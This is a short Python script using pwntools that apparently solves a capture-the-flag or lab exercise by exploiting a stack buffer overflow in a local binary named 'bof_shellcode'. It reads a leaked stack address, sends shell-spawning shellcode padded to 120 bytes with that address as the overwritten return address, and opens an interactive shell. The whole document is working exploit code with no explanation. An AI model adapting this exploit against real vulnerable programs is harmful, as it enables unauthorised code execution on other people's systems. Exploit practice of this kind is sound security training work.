from pwn import *

context.arch = 'amd64'
p = process('./bof_shellcode')

p.recvuntil('input ')
stack = p.recvline().strip()
stack = int(stack, 16)
payload = asm(shellcraft.sh())
payload += b'a'*(120-len(payload))
payload += p64(stack)
p.sendlineafter(':', payload)
p.recv()

p.interactive()
